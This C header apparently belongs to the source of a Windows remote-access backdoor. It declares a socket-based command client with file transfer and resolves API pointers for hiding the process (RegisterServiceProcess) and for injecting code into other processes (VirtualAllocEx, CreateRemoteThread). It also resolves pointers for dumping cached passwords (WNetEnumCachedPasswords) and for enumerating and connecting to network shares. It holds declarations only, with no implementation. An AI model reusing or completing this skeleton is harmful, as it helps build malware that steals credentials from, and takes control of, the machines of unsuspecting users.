#ifndef _MAIN_H_
#define _MAIN_H_

#include <winsock2.h>
#include <tlhelp32.h>

#define WM_MAINSOCKET (WM_USER + 1)

#define TM_KEEPALIVE 0

typedef struct {
	unsigned long len;
	unsigned short argc;
	unsigned short cmd;
} MsgHdr;

typedef struct {
	SOCKET hSocket;
	SOCKADDR_IN hSin;
	char SocketBuffer[4096];
	char *RecvBuffer, *SendBuffer;
	unsigned long RecvBufSize, SendBufSize;
	HANDLE hFile;
	bool Transferring;
} Client;

typedef struct {
	HANDLE hFile;
	SOCKET hSocket;
	DWORD FileSize;
	DWORD Offset;
} FILETRANSFERARGS;

typedef DWORD (WINAPI *PREGISTERSERVICEPROCESS)(DWORD, DWORD);
typedef HANDLE (WINAPI *PCREATETOOLHELP32SNAPSHOT)(DWORD, DWORD);
typedef BOOL (WINAPI *PPROCESS32FIRST)(HANDLE, LPPROCESSENTRY32);
typedef BOOL (WINAPI *PPROCESS32NEXT)(HANDLE, LPPROCESSENTRY32);
typedef BOOL (WINAPI *PMODULE32FIRST)(HANDLE, LPMODULEENTRY32);
typedef BOOL (WINAPI *PMODULE32NEXT)(HANDLE, LPMODULEENTRY32);
typedef BOOL (WINAPI *PTHREAD32FIRST)(HANDLE, LPTHREADENTRY32);
typedef BOOL (WINAPI *PTHREAD32NEXT)(HANDLE, LPTHREADENTRY32);
typedef HANDLE (WINAPI *PCREATEREMOTETHREAD)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);   
typedef BOOL (WINAPI *PVIRTUALFREEEX)(HANDLE, LPVOID, SIZE_T, DWORD);
typedef LPVOID (WINAPI *PVIRTUALALLOCEX)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);

extern PREGISTERSERVICEPROCESS pRegisterServiceProcess;
extern PCREATETOOLHELP32SNAPSHOT pCreateToolhelp32Snapshot;
extern PPROCESS32FIRST pProcess32First;
extern PPROCESS32NEXT pProcess32Next;
extern PMODULE32FIRST pModule32First;
extern PMODULE32NEXT pModule32Next;
extern PTHREAD32FIRST pThread32First;
extern PTHREAD32NEXT pThread32Next;
extern PCREATEREMOTETHREAD pCreateRemoteThread;
extern PVIRTUALFREEEX pVirtualFreeEx;
extern PVIRTUALALLOCEX pVirtualAllocEx;

typedef BOOL (FAR PASCAL *CACHECALLBACK)( struct PASSWORD_CACHE_ENTRY FAR *pce, DWORD dwRefData );
typedef DWORD (WINAPI *ENUMPASSWORD)(LPSTR pbPrefix, WORD  cbPrefix, BYTE  nType, CACHECALLBACK pfnCallback, DWORD dwRefData);
typedef DWORD (WINAPI *WNETCLOSEENUM)(HANDLE henum);
typedef DWORD (WINAPI *WNETENUMRESOURCE)(HANDLE henum, LPDWORD lpcCount, LPVOID lpBuffer, LPDWORD lpBufferSize );
typedef DWORD (WINAPI *WNETOPENENUM)(DWORD dwScope, DWORD dwType, DWORD dwUsage, LPNETRESOURCE lpNetResource, LPHANDLE lphEnum );
typedef DWORD (WINAPI *WNETCANCELCONNECTION2)(LPCSTR lpName, DWORD dwFlags, BOOL fForce);
typedef DWORD (WINAPI *WNETADDCONNECTION2)(LPNETRESOURCEA lpNetResource, LPCSTR lpPassword, LPCSTR lpUserName, DWORD dwFlags);

extern ENUMPASSWORD pWNetEnumCachedPasswords;
extern WNETCLOSEENUM pWNetCloseEnum;
extern WNETENUMRESOURCE pWNetEnumResource;
extern WNETOPENENUM pWNetOpenEnum;
extern WNETCANCELCONNECTION2 pWNetCancelConnection2;
extern WNETADDCONNECTION2 pWNetAddConnection2;

void free(void *pv);
void *malloc(unsigned int cb);
void *realloc(void *pv, unsigned int cb);
void *operator new(unsigned int cb);
void operator delete(void *pv);
extern "C" int _purecall(void);
int memcmp(const void *buf1, const void *buf2, unsigned int count);
#pragma intrinsic(memcmp)
void *memset(void *dst, int val, unsigned int count);
#pragma intrinsic(memset)
void *memcpy(void *dst, const void *src, unsigned int count);
#pragma intrinsic(memcpy)
void *memmove(void *dst, const void *src, unsigned int count);

#endif